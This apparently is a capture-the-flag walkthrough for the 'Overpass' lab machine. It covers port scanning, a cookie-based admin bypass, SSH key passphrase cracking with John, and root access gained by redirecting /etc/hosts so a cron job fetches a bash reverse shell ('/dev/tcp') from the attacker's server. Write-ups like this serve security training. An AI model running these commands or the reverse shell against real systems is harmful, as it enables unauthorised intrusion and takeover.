# Overpass

> thegurpreet | Mar 2021

---

##Gaining system access

Setting ip variable
```
export ip=10.10.239.129
```

Scanning ports using nmap. Found SSH and HTTP port open
```
sudo nmap -sV -sV -A $ip
```

Scanning the URL to check if theere some hidden directories
```
gobuster dir -u http://$ip -w /usr/share/dirb/wordlists/big.txt -t 100
```

File called javascript.js is responsible for authentication on /admin page. Setting a session cookie on firefox console:
```
Cookies.set("SessionToken", "")
```

Setting correct permissions to use rsa.key for James login
```
chmod 600 rsa.key
```

Crack the passphrase of rsa key. First run ssh2john.py
```
/usr/share/john/ssh2john.py rsa.key > rsa_id.txt
```

Then run john to crack the passphrase
```
sudo john --wordlist=/usr/share/wordlists/rockyou.txt rsa_id.txt
```

Login using ssh and supply John's passphrase (james13) to connect
```
ssh -i rsa.key james@$ip
```

## Privilege Escalation

Need to check automated build scripts in crontab
```
cat todo.txt
```

Checking crontab command
```
cat /etc/crontab
```

Check if hosts file is writable
```
ls -l /etc/hosts
nano /etc/hosts
```

Replace existing IP for overpass.thm with your machine (attacker) IP address
```
10.xx.xx.xx    overpass.thm
```

Creating local file with bash revere shell
```
mkdir downloads/src -p
echo "bash -i >& /dev/tcp/10.x.x.x/1234 0>&1" > downloads/src/buildscript.sh
```
Source - http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Starting webserver using python
```
sudo python3 -m http.server 80
```

Starting nc listner
```
nc -lvnp 1234
```

Root access!!

[Optional] I also tried using nikto to use cross-site scripting attack which didn't work
```
nikto -h $ip
```